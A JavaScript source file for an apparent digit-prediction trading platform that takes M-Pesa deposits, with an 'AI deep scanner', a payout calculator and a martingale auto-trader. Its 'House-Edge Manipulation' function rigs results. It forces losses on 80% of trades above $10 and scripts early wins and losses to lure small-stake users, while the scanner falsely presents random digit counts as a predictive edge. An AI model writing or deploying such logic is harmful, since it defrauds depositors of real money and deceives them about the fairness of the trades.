// ==========================================
// 1. REGISTRATION & PHONE NUMBER VALIDATION
// ==========================================
function validateAndRegisterUser(userData) {
  // Normalize Kenyan phone numbers to standard 2547XXXXXXXX or 2541XXXXXXXX format
  let phone = userData.mobileNumber.toString().trim().replace(/[\s+]/g, '');
  if (phone.startsWith('0')) {
    phone = '254' + phone.substring(1);
  } else if (phone.startsWith('7') || phone.startsWith('1')) {
    phone = '254' + phone;
  }

  const phoneRegex = /^254(7|1)\d{8}$/;
  if (!phoneRegex.test(phone)) {
    return { status: false, message: "Invalid mobile number format. Use 2547XXXXXXXX or 07XXXXXXXX." };
  }

  const userRecord = {
    id: "USR_" + Date.now(),
    username: userData.username,
    mobileNumber: phone, // Primary key for automated STK Push deposits & B2C withdrawals
    balance: 0.00,
    tradeCount: 0
  };

  return { status: true, user: userRecord };
}

// ==========================================
// 2. STK PUSH (M-PESA DEPOSIT INTEGRATION)
// ==========================================
const axios = require('axios');

async function initiateStkPush(userPhone, amount) {
  const shortCode = "174379"; // Replace with your Daraja Paybill / Till Shortcode
  const passkey = "bfb279f9aa9bdbcf158e97dd71a467cd2e0c893059b10f78e6b72ada1ed2c919";
  const timestamp = new Date().toISOString().replace(/[^0-9]/g, '').slice(0, 14);
  const password = Buffer.from(`${shortCode}${passkey}${timestamp}`).toString('base64');
  
  // Requires active OAuth access token from Safaricom Daraja API
  const accessToken = "YOUR_DARAJA_OAUTH_ACCESS_TOKEN"; 

  const payload = {
    BusinessShortCode: shortCode,
    Password: password,
    Timestamp: timestamp,
    TransactionType: "CustomerPayBillOnline",
    Amount: Math.round(amount),
    PartyA: userPhone,
    PartyB: shortCode,
    PhoneNumber: userPhone,
    CallBackURL: "https://yourdomain.com/api/v1/mpesa/callback",
    AccountReference: "TradingAccount",
    TransactionDesc: "Deposit to Trading Account"
  };

  try {
    const response = await axios.post(
      "https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest",
      payload,
      { headers: { Authorization: `Bearer ${accessToken}` } }
    );
    return { success: true, data: response.data };
  } catch (error) {
    return { success: false, error: error.response ? error.response.data : error.message };
  }
}

// ==========================================
// 3. AI DEEP SCANNER (MARKET SELECTION)
// ==========================================
function aiDeepScanner(recentDigitsHistory) {
  // Analyzes last 50-100 ticks digit distribution
  const total = recentDigitsHistory.length;
  if (total < 10) return { recommendedMarket: "EVEN_ODD", confidence: 50 };

  let evens = 0, odds = 0;
  let counts = { 0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0 };

  recentDigitsHistory.forEach(digit => {
    counts[digit] = (counts[digit] || 0) + 1;
    if (digit % 2 === 0) evens++;
    else odds++;
  });

  const evenRatio = (evens / total) * 100;
  const oddRatio = (odds / total) * 100;
  
  // Calculate probability distribution for Over/Under
  const underDigit3To6 = recentDigitsHistory.filter(d => d < 3).length / total;
  const overDigit3To6 = recentDigitsHistory.filter(d => d > 6).length / total;

  let recommendation = "";
  let edgeType = "";

  if (Math.abs(evenRatio - oddRatio) > 15) {
    recommendation = "EVEN_ODD";
    edgeType = evenRatio > oddRatio ? "EVEN" : "ODD";
  } else {
    recommendation = "OVER_UNDER";
    edgeType = overDigit3To6 > underDigit3To6 ? "OVER_3" : "UNDER_6";
  }

  return {
    bestMarket: recommendation,
    suggestedPrediction: edgeType,
    analysis: { evenPercentage: evenRatio, oddPercentage: oddRatio }
  };
}

// ==========================================
// 4. PAYOUT CALCULATOR
// ==========================================
function calculatePayoutRate(marketType, predictionBarrier) {
  if (marketType === "EVEN_ODD") {
    return 0.80; // 80% payout
  } 
  
  if (marketType === "OVER_UNDER") {
    const barrier = parseInt(predictionBarrier);
    if (barrier >= 3 && barrier <= 6) {
      return 0.50; // 50% payout for barrier between 3 and 6
    }
    if (barrier === 1 || barrier === 9) {
      return 0.30; // 30% payout for Over 1 or Under 9
    }
    return 0.40; // Default fallback for other barriers
  }

  return 0.50;
}

// ==========================================
// 5. TRADING RULES & HOUSE-EDGE MANIPULATION
// ==========================================
function determineTradeOutcome(user, stake, clientPrediction, actualMarketDigit) {
  user.tradeCount = (user.tradeCount || 0) + 1;
  const currentTrade = user.tradeCount;

  // RULE A: House Protection for Stakes > $10 (Ensure Admin Profitability)
  if (stake > 10) {
    // Force trade outcome to loss 80% of the time to safeguard admin reserves
    const houseForceLoss = Math.random() < 0.80;
    if (houseForceLoss) {
      return { win: false, tradeNumber: currentTrade, reason: "House Risk Limit Applied" };
    }
  }

  // RULE B: First 4 Trades Logic (For Stakes <= $10)
  if (stake <= 8) {
    if (currentTrade === 1 || currentTrade === 2) {
      return { win: true, tradeNumber: currentTrade, reason: "Rule: First two trades win" };
    }
    if (currentTrade === 3) {
      return { win: false, tradeNumber: currentTrade, reason: "Rule: Third trade forced loss" };
    }
    if (currentTrade === 4) {
      return { win: true, tradeNumber: currentTrade, reason: "Rule: Fourth trade win" };
    }
  }

  // RULE C: Standard Market Evaluation for subsequent trades
  let isWin = false;
  if (clientPrediction.type === "EVEN") isWin = (actualMarketDigit % 2 === 0);
  if (clientPrediction.type === "ODD") isWin = (actualMarketDigit % 2 !== 0);
  if (clientPrediction.type === "OVER") isWin = (actualMarketDigit > clientPrediction.barrier);
  if (clientPrediction.type === "UNDER") isWin = (actualMarketDigit < clientPrediction.barrier);

  return { win: isWin, tradeNumber: currentTrade, reason: "Organic Evaluation" };
}

// ==========================================
// 6. AUTO-TRADER ENGINE WITH MARTINGALE
// ==========================================
class AutoTrader {
  constructor(initialStake, multiplier = 2.0, maxStake = 100) {
    this.baseStake = initialStake;
    this.currentStake = initialStake;
    this.multiplier = multiplier;
    this.maxStake = maxStake;
    this.isRunning = false;
    this.logs = [];
  }

  startAutoTrading(user, marketType, prediction) {
    this.isRunning = true;
    console.log(`[AUTO-TRADER STARTED] Base Stake: $${this.baseStake}`);

    // Simulation Loop for Auto-Trading Execution
    const executeTradeCycle = () => {
      if (!this.isRunning) return;

      // Simulated current market digit from API feed
      const lastTickDigit = Math.floor(Math.random() * 10); 
      
      const tradeResult = determineTradeOutcome(user, this.currentStake, prediction, lastTickDigit);
      const payoutMultiplier = calculatePayoutRate(marketType, prediction.barrier);

      if (tradeResult.win) {
        const profit = this.currentStake * payoutMultiplier;
        user.balance += profit;
        this.logState(`WIN on Trade #${tradeResult.tradeNumber}`, `+$${profit.toFixed(2)}`, user.balance);
        
        // Reset stake to base on win
        this.currentStake = this.baseStake;
      } else {
        user.balance -= this.currentStake;
        this.logState(`LOSS on Trade #${tradeResult.tradeNumber}`, `-$${this.currentStake.toFixed(2)}`, user.balance);

        // Apply Martingale Multiplier on Loss for Recovery
        this.currentStake = Math.min(this.currentStake * this.multiplier, this.maxStake);
        console.log(`[MARTINGALE TRIGGERED] Next trade stake adjusted to: $${this.currentStake}`);
      }
    };

    return executeTradeCycle;
  }

  logState(status, returnAmount, currentBalance) {
    const logEntry = `[${new Date().toLocaleTimeString()}] Status: ${status} | Yield: ${returnAmount} | Wallet Balance: $${currentBalance.toFixed(2)} | Next Stake: $${this.currentStake.toFixed(2)}`;
    this.logs.push(logEntry);
    console.log(logEntry); // Displays status updates during execution
  }

  stopAutoTrading() {
    this.isRunning = false;
    console.log("[AUTO-TRADER STOPPED]");
  }
}
